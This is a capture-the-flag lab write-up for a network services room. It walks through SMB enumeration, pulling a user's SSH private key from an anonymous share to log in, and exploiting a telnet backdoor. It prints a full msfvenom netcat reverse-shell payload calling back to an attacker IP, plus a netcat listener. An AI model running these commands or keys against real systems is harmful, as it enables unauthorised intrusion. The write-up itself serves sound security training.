# Activity performed as part of Network Services Room

- **Phase 1(Enumerating SMB)** :

1. Start the Attack Machine, LAB MACHINE available.
2. Run nmap to perfrom basic enumeration on the target/lab machine. Execute "nmap -sV -vv <IP>".
3. Run enum4linux to perform enumeration on SMB services as we are currently focused on SMB. Execute "ennum4linux -a <IP>" provides all the basic information regarding the target as part of the enumeration.

- **Phase 1(Exploiting SMB)** :

According to the SMB enumeration there is a misconfiguration that can help us in gaining access. As we see that "profiles" share can be accessed according to the enum4linux enumeration this the possible misconfiguration that allows Anonymous user login.
1. Execute "smbclient //<IP>/profiles -U Anonymous" command, User should be able to access the profiles share through a prompt.
2. Execute "ls" command, to list all the files listed in the share.

Among the files listed, one of the file would provide additional informaation on how to login as a user.
1. Execute "more <file_name>" command, to view the file content.

According to the file content the user John Cactus has ssh login enabled since the organization start to introduce WFH.
1. Execute "cd .ssh" command to navigate to .ssh directory present in the share.
2. Execute "ls" command to list all the directories and files present in .shh directory.

Directory contains private key and public key of RSA which can be utilizted to login through ssh. Additionally there is an authorize file.
1. Execute "mget <file_name>" and "mget <file_name>.pub" command, to get the files(public key and private key) to the local machine.
2. Execute "chmod 600 <file_name>" command, to change the permissions on the private key file.

Since, We now have both the files(Public key and Private key). We can login as John Cactus to the target machine and access the target machine. The username can be found in the public key file.
1. Executed "ssh <file_name> <username>@<IP>" command, to login to target machine as the user John Cactus.
2. Execute "ls" command to view the list of files and directories in the pwd.
3. Execute "cat smb.txt" command, to retrive the flag present in the file.

- **Phase 2(Enumerating Telnet)** :
1. Execute the command "nmap -sS -A -vv -p- <IP> > <output_file>", to get the information about the target IP. Command TCP SYN scan, Aggresive scan, port scan of all 65535 ports with level 2 verbosity.
2. Execute the command "nmap -sS -A -vv <IP>", to perform port scan on all the starndard ports of the target.

- **Phase 2(Exploiting Telnet)** :
1. Execute the command "telnet <IP> <Port>", to get connected with the target machines telnet service.

As the connection povides a footholding on the target machine. We can try out few things which can help us analyze how things are going. Accoring to information after the connection. The current port is a Backdoor used by Skidy. Following are few command which can be used .HELP, .RUN <command>, .EXIT . Upon trying to execute command using the .RUN command no output was provided on the server. In order to check its getting executed as system commands here are few things we can check.
1. Execute the command "sudo tcpdump ip proto \\icmp -i tun0"/"sudo tcpdump ip proto \\icmp -i ens5"(Your VM) or (Attackbox). To initailizea listener on the local machine.
2. Execute the command "ping <[local THM ip]/[Your VM]> -c 1", to ping the local machine from the target machine which is running a telnet service.

Upon verifying that req-res is coming up on the local machine. Continue with Exploitation.
In order to get a reverse shell on the local machine. We are using msfvenom to create a payload that can provide us the reverse shell on a specified port.
1. Execute the command "msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip]/[attack box IP] lport=4444 R", to generate a payload that can be executed on the target and receive reverse shell over the port 4444.

Explination of the above command: 
-p = payload
lhost = our local host IP address (this is your machine's IP address)
lport = the port to listen on (this is the port on your machine)
R = export the payload in raw format

2. Execute the command "nc -lvnp 4444", to listen to the port on the local machine.
3. Execute the command ".RUN <payload>", to get a reverse shell on the listening port.
Payload used as part of the activity: "mkfifo /tmp/qnnue; nc 10.10.140.29 4444 0</tmp/qnnue | /bin/sh > tmp/qnnue 2>&1; rm /tmp/qnnue"

mkfifo /tmp/qnnue -> creates a new named pipe at /tmp/qnnue
nc 10.10.140.29 4444 0</tmp/qnnue -> connects to IP and sends contents of /tmp/qnnue as stdin
/bin/sh > tmp/qnnue 2>&1 -> opens terminal shell and redirects output/errors to tmp/qnnue 
rm /tmp/qnnue -> It deletes the file /tmp/qnnue from the system.

Navigate through the file structure to get the flag.



